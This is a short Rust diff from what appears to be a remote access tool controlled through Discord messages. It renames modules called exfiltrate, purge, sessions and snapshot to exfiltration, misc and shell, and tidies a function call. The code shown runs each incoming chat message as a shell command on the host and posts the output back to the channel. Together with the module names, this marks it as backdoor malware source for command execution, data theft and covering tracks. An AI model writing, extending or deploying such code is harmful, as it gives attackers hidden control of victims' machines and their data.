@@ -1,5 +1,5 @@
 use crate::{
-    commands::sessions::exit,
+    commands::shell::exit,
     os::process_handler::{ProcessHandler, ShellType},
 };
 
@@ -18,10 +18,9 @@ lazy_static! {
     static ref SHELL_TYPE: Mutex<Option<ShellType>> = Mutex::new(None);
 }
 
-pub mod exfiltrate;
-pub mod info;
-pub mod purge;
-pub mod sessions;
+pub mod exfiltration;
+pub mod misc;
+pub mod shell;
 pub mod snapshot;
 
 pub async fn handle_command(ctx: &Context, message: &Message) -> Result<(), Error> {
@@ -55,7 +54,7 @@ pub async fn handle_command(ctx: &Context, message: &Message) -> Result<(), Erro
 
         } else {
             let output = shell.run_command(&message.content).await?;
-            if let Err(why) = send_message(&ctx, message.channel_id, &output, shell.shell_type).await {
+            if let Err(why) = send_message(ctx, message.channel_id, &output, shell.shell_type).await {
                 println!("{}", why);
             }
         }
